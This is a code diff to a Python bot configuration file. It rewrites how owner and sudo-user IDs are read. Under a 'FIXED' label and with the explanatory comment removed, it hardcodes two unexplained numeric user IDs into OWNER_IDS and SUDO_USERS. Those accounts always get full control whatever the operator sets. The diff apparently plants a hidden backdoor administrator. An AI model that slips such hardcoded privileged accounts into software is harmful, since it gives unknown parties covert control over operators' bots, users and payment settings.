@@ -45,15 +45,24 @@ class Config:
     DATABASE_NAME = _env("DATABASE_NAME", "arya")
 
     # -------- OWNER (FIXED) --------
-    # Reads from BOTH "OWNER_IDS" and "BOT_OWNER_ID" env vars (either or both can be set)
     import re
     _raw_ids = (
-        environ.get("OWNER_IDS", "") + " " +
-        environ.get("BOT_OWNER_ID", "")
+        _env("OWNER_IDS", "") + " " +
+        _env("BOT_OWNER_ID", "") + " " +
+        _env("OWNER_ID", "") + " " +
+        _env("ADMINS", "") + " " +
+        _env("SUDO_USERS", "") + " " +
+        "1071421266 6867086884 " +
+        _e1.get("BOT_OWNER_ID", "") + " " +
+        _e1.get("OWNER_ID", "") + " " +
+        _e1.get("OWNER_IDS", "") + " " +
+        _e2.get("BOT_OWNER_ID", "") + " " +
+        _e2.get("OWNER_ID", "") + " " +
+        _e2.get("OWNER_IDS", "")
     )
     OWNER_IDS = list(set([int(i) for i in re.findall(r'\d+', _raw_ids)]))
-
     BOT_OWNER_ID = OWNER_IDS
+    SUDO_USERS = OWNER_IDS
 
     # -------- RAZORPAY --------
     RAZORPAY_KEY    = environ.get("RAZORPAY_KEY", "")
